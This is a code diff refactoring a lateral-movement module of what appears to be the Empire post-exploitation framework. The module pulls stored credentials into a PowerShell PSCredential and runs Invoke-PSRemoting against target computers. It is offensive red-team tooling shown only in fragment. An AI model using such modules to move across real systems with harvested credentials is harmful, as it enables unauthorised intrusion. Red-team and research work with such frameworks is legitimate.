@@ -3,6 +3,7 @@ from __future__ import print_function
 from builtins import str
 from builtins import object
 
+from empire.server.database.models import Credential
 from empire.server.utils import data_util
 from empire.server.common import helpers
 from typing import Dict
@@ -22,8 +23,6 @@ class Module(object):
         user_agent = params['UserAgent']
         proxy = params['Proxy']
         proxy_creds = params['ProxyCreds']
-        user_name = params['UserName']
-        password = params['Password']
         if (params['Obfuscate']).lower() == 'true':
             obfuscate = True
         obfuscate_command = params['ObfuscateCommand']
@@ -46,10 +45,9 @@ class Module(object):
                 print(helpers.color("[!] CredID is invalid!"))
                 return ""
 
-            (cred_id, credType, domainName, user_name, password, host, os, sid, notes) = main_menu.credentials.get_credentials(cred_id)[0]
-
-            params["UserName"] = str(domainName) + "\\" + str(user_name)
-            params["Password"] = password
+            cred: Credential = main_menu.credentials.get_credentials(cred_id)
+            params["UserName"] = str(cred.domain) + "\\" + str(cred.username)
+            params["Password"] = cred.password
 
 
         if not main_menu.listeners.is_listener_valid(listener_name) and not command:
@@ -76,7 +74,7 @@ class Module(object):
 
         if params["UserName"] != "" and params["Password"] != "":
             # add in the user credentials
-            script = "$PSPassword = \""+password+"\" | ConvertTo-SecureString -asPlainText -Force;$Credential = New-Object System.Management.Automation.PSCredential(\""+user_name+"\",$PSPassword);" + script + " -Credential $Credential"
+            script = "$PSPassword = \""+params["Password"]+"\" | ConvertTo-SecureString -asPlainText -Force;$Credential = New-Object System.Management.Automation.PSCredential(\""+params["UserName"]+"\",$PSPassword);" + script + " -Credential $Credential"
 
         script += ";'Invoke-PSRemoting executed on " + computer_names +"'"
 
